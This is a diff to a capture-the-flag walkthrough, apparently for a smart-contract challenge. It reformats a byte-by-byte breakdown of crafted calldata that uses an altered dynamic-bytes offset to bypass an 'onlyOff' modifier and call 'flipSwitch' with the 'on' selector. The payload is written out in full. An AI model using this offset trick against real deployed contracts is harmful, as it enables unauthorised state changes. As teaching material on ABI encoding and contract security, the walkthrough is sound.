@@ -80,24 +80,36 @@ const calldata = web3.eth.abi.encodeFunctionCall({
 
 Let's make sense of this byte array monster using what we know about dynamic and a trusty <a target="\_blank" rel="noopener noreferrer" hre="https://wordcounter.net/character-count">character counter</a>.
 
-`0x` Doesn't count, it just indicates we are dealing in bytes.
-`30c13ade` 4 bytes representing the function selector of `flipSwitch` with `offSelector` or `"0x20606e15"` as argument.
-`0000000000000000000000000000000000000000000000000000000000000020` 32 bytes representing a 32 (0x20 in decimal) bytes offset.
-`0000000000000000000000000000000000000000000000000000000000000004` 32 bytes representing the length of the value. Only 4 bytes long in this case.
-`20606e1500000000000000000000000000000000000000000000000000000000` 32 bytes which is the `offSelector` right padded by 28 bytes of zeroes.
+- `0x` Doesn't count, it just indicates we are dealing in bytes.  
+
+- `30c13ade` 4 bytes representing the function selector of `flipSwitch` with `offSelector` or `"0x20606e15"` as argument.  
+
+- `0000000000000000000000000000000000000000000000000000000000000020` 32 bytes representing a 32 (0x20 in decimal) bytes offset.  
+
+- `0000000000000000000000000000000000000000000000000000000000000004` 32 bytes representing the length of the value. Only 4 bytes long in this case.  
+
+- `20606e1500000000000000000000000000000000000000000000000000000000` 32 bytes which is the `offSelector` right padded by 28 bytes of zeroes.  
+
 
 3. Let's create our own `calldata` with `offSelector` at the 68th byte but let's tell the EVM to look for the value 
 of the argument elsewhere and we will point it to the value of `onSelector`.
 
-`0x` Doesn't count, it just indicates we are dealing in bytes.
-`30c13ade` Same 4 bytes representing the function selector of `flipSwitch` with `offSelector` or `"0x20606e15"` as argument.
-`0000000000000000000000000000000000000000000000000000000000000060` 32 bytes representing a 96 (0x60 in decimal) bytes offset. This is how
-we exploit the `onlyOff` function modifier.
-`0000000000000000000000000000000000000000000000000000000000000000` Some extra bytes that we introduces with the new padding.
-`20606e1500000000000000000000000000000000000000000000000000000000` 32 bytes which is the `offSelector` right padded by 28 bytes of zeroes. 
-It is still at the 68th byte and so the `onlyOff` require function will be happy.
-`0000000000000000000000000000000000000000000000000000000000000004` 32 bytes representing the length of the value which is 4.
-`76227e1200000000000000000000000000000000000000000000000000000000` 32 bytes which is the `onSelector` right padded with zeroes.
+- `0x` Doesn't count, it just indicates we are dealing in bytes.  
+
+- `30c13ade` Same 4 bytes representing the function selector of `flipSwitch` with `offSelector` or `"0x20606e15"` as argument.  
+
+- `0000000000000000000000000000000000000000000000000000000000000060` 32 bytes representing a 96 (0x60 in decimal) bytes offset. This is how
+we exploit the `onlyOff` function modifier.  
+
+- `0000000000000000000000000000000000000000000000000000000000000000` Some extra bytes that we introduces with the new padding.  
+
+- `20606e1500000000000000000000000000000000000000000000000000000000` 32 bytes which is the `offSelector` right padded by 28 bytes of zeroes. 
+It is still at the 68th byte and so the `onlyOff` require function will be happy.  
+
+- `0000000000000000000000000000000000000000000000000000000000000004` 32 bytes representing the length of the value which is 4.  
+
+- `76227e1200000000000000000000000000000000000000000000000000000000` 32 bytes which is the `onSelector` right padded with zeroes.  
+
 
 4. All that is left is to call `flipSwitch` with the listed byte strings concatenated into a giant one.
 
